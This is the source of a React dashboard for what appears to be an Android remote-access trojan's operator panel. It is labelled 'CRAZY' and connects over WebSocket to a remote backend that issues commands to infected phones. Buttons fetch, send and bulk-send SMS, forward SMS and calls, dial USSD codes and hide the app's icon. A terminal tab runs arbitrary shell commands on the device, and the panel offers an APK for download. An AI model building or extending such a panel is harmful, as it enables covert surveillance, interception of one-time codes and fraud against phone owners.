"use client";
import { useState, useEffect, useRef } from 'react';

export default function Dashboard() {
  const [activeTab, setActiveTab] = useState('Home');
  const [devices, setDevices] = useState<any>({});
  const [selectedDevice, setSelectedDevice] = useState<string | null>(null);
  const [terminalOut, setTerminalOut] = useState<string>('');
  const ws = useRef<WebSocket | null>(null);

  useEffect(() => {
    ws.current = new WebSocket('wss://onxy-backend.onrender.com/ws?role=admin');
    ws.current.onmessage = (event) => {
      try {
        const data = JSON.parse(event.data);
        if (data.device_id) {
          setDevices((prev: any) => ({ ...prev, [data.device_id]: data }));
          if (!selectedDevice) setSelectedDevice(data.device_id);
        }
        if (data.type === 'shell_response') setTerminalOut(data.data);
      } catch (e) {}
    };
    return () => ws.current?.close();
  }, [selectedDevice]);

  const sendCommand = (command: string, payload: any = {}) => {
    if (ws.current?.readyState === WebSocket.OPEN && selectedDevice) {
      ws.current.send(JSON.stringify({ target: selectedDevice, type: 'cmd', command, payload }));
    }
  };

  const handleLogout = () => { document.cookie = 'auth_token=; Max-Age=0; path=/;'; window.location.href = '/login'; };
  const dev = devices[selectedDevice || ''] || {};

  return (
    <div className="min-h-screen bg-[#0B0C10] text-white font-sans">
      {/* HEADER */}
      <header className="flex justify-between items-center p-4 border-b border-gray-800 bg-[#1A1B23]">
        <div className="flex items-center gap-3">
          <div className="w-10 h-10 rounded-full bg-purple-600 flex items-center justify-center text-xl">👤</div>
          <div>
            <h1 className="font-bold text-lg text-purple-400">CRAZY</h1>
            <p className="text-xs text-gray-400">Web Admin</p>
          </div>
        </div>
        <div className="flex items-center gap-4">
          <a href="/crazy-onxy-MDM/app-debug.apk" download className="bg-purple-600 px-4 py-2 rounded-lg font-bold text-sm">⬇ Download APK</a>
          <span className="text-xl cursor-pointer">⚙️</span>
          <span className="text-sm text-purple-400 border border-purple-500 px-3 py-1 rounded-full">🔑 Sessions</span>
          <span className="text-xl cursor-pointer">🌙</span>
          <button onClick={handleLogout} className="text-xs text-red-500 border border-red-500 px-2 py-1 rounded">Logout</button>
        </div>
      </header>

      {/* MAIN NAVIGATION */}
      <nav className="flex gap-6 p-4 border-b border-gray-800 text-sm overflow-x-auto">
        {['Home', 'Data', 'Messages', 'Groups', 'Devices', 'Terminal', 'Help'].map(tab => (
          <button key={tab} onClick={() => setActiveTab(tab)} className={`pb-2 whitespace-nowrap ${activeTab === tab ? 'border-b-2 border-purple-500 text-white font-bold' : 'text-gray-400'}`}>{tab}</button>
        ))}
      </nav>

      <main className="p-4">
        {/* DASHBOARD HOME TAB */}
        {activeTab === 'Home' && selectedDevice && (
          <>
            {/* SUB TABS */}
            <div className="flex gap-2 mb-4 text-sm overflow-x-auto">
              {['Home', 'Data', 'Messages (200)', 'Gallery', 'Permissions'].map(tab => (
                <button key={tab} className={`px-4 py-2 rounded whitespace-nowrap ${tab === 'Home' ? 'bg-blue-600 font-bold' : 'bg-[#1A1B23] text-gray-400'}`}>{tab}</button>
              ))}
            </div>

            {/* DEVICE CARD */}
            <div className="bg-[#1A1B23] p-5 rounded-xl border border-gray-800 mb-6">
              <div className="flex justify-between items-start mb-4">
                <h2 className="text-xl font-bold">{dev.model || 'vivo (V2518)'} <span className="text-xs bg-green-800 text-green-300 px-2 py-1 rounded ml-2">16</span></h2>
              </div>
              <div className="grid grid-cols-2 gap-y-3 text-sm text-gray-300">
                <div className="flex justify-between pr-4"><span>ID</span> <span className="text-white">{selectedDevice}</span></div>
                <div className="flex justify-between pr-4"><span>IP Address</span> <span className="text-blue-400">{dev.ip || 'Fetching...'}</span></div>
                <div className="flex justify-between pr-4"><span>Connection</span> <span className="text-green-400">🟢 Online</span></div>
                <div className="flex justify-between pr-4"><span>FCM Token</span> <span className="text-green-400">✔️ Token OK</span></div>
              </div>
            </div>

            {/* 8 CORE BUTTONS */}
            <div className="grid grid-cols-4 gap-3 mb-6">
              {[
                { label: 'Check Online', icon: '📡', cmd: 'CHECK_ONLINE' },
                { label: 'GET SMS', icon: '📥', cmd: 'GET_SMS' },
                { label: 'Bulk SMS', icon: '✉️', cmd: 'BULK_SMS' },
                { label: 'Send SMS', icon: '📤', cmd: 'SEND_SMS' },
                { label: 'SMS Forward', icon: '🔄', cmd: 'SMS_FORWARD' },
                { label: 'Call Forward', icon: '📞', cmd: 'CALL_FORWARD' },
                { label: 'Dial USSD', icon: '🔢', cmd: 'DIAL_USSD' },
                { label: 'Auto Token', icon: '⚡', cmd: 'AUTO_TOKEN' }
              ].map((btn, i) => (
                <button key={i} onClick={() => sendCommand(btn.cmd)} className="bg-[#1A1B23] border border-gray-800 hover:border-purple-500 p-4 rounded-xl flex flex-col items-center justify-center gap-2 transition">
                  <span className="text-2xl">{btn.icon}</span>
                  <span className="text-xs font-semibold text-gray-300">{btn.label}</span>
                </button>
              ))}
            </div>

            {/* STEALTH BOX (New Space Used) */}
            <div className="bg-[#1A1B23] p-5 rounded-xl border border-purple-900 mb-6">
              <h3 className="text-md font-bold text-purple-400 mb-4 flex items-center gap-2">🕵️ Stealth & Advanced Controls</h3>
              <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
                <button onClick={() => sendCommand('HIDE_ICON')} className="bg-black border border-purple-800 hover:bg-purple-900 text-white p-3 rounded-lg flex flex-col items-center gap-1"><span className="text-xl">🙈</span><span className="text-xs font-bold">Hide Icon</span></button>
                <button onClick={() => sendCommand('SHOW_ICON')} className="bg-black border border-gray-700 hover:bg-gray-800 text-white p-3 rounded-lg flex flex-col items-center gap-1"><span className="text-xl">👁️</span><span className="text-xs font-bold">Show Icon</span></button>
                <button className="bg-black border border-gray-700 hover:bg-gray-800 text-white p-3 rounded-lg flex flex-col items-center gap-1"><span className="text-xl">🔒</span><span className="text-xs font-bold">Admin Lock</span></button>
                <button onClick={() => setActiveTab('Terminal')} className="bg-black border border-gray-700 hover:bg-gray-800 text-white p-3 rounded-lg flex flex-col items-center gap-1"><span className="text-xl">💻</span><span className="text-xs font-bold">Terminal</span></button>
              </div>
            </div>
          </>
        )}

        {/* HELP TAB */}
        {activeTab === 'Help' && (
          <div className="bg-[#1A1B23] p-6 rounded-xl border border-gray-800 text-gray-300 space-y-4 text-sm">
            <h2 className="text-xl font-bold text-purple-400 mb-4">Dashboard Guide</h2>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              <div>
                <h3 className="font-bold text-white mb-2">Core Actions</h3>
                <ul className="list-disc pl-5 space-y-1">
                  <li><strong>Check Online:</strong> Pings the device.</li>
                  <li><strong>GET SMS:</strong> Fetches SMS from device.</li>
                  <li><strong>Send/Bulk SMS:</strong> Sends SMS from device.</li>
                  <li><strong>SMS/Call Forward:</strong> Diverts SMS/Calls.</li>
                  <li><strong>Dial USSD:</strong> Runs USSD code (*123#).</li>
                </ul>
              </div>
              <div>
                <h3 className="font-bold text-white mb-2">Stealth & Advanced</h3>
                <ul className="list-disc pl-5 space-y-1">
                  <li><strong>Hide Icon:</strong> Hides app icon on device.</li>
                  <li><strong>Terminal:</strong> Runs shell commands.</li>
                </ul>
              </div>
            </div>
          </div>
        )}

        {/* TERMINAL TAB */}
        {activeTab === 'Terminal' && selectedDevice && (
          <div className="bg-[#1A1B23] p-6 rounded-xl border border-gray-800">
            <h2 className="text-xl font-bold text-purple-400 mb-4">Command Centre</h2>
            <div className="flex gap-2 mb-4">
              <input type="text" id="cmdInput" placeholder="e.g. pm list packages" className="bg-black border border-gray-700 rounded p-3 w-full font-mono text-white" />
              <button onClick={() => {
                  const cmd = (document.getElementById('cmdInput') as HTMLInputElement).value;
                  sendCommand('EXECUTE_SHELL', { command: cmd });
                  setTerminalOut('Executing...');
              }} className="bg-purple-600 px-6 py-2 rounded font-bold">Run</button>
            </div>
            <pre className="bg-black p-4 rounded-lg border border-gray-700 text-green-400 text-sm overflow-x-auto min-h-[200px]">{terminalOut || 'Terminal ready...'}</pre>
          </div>
        )}
      </main>
    </div>
  );
}
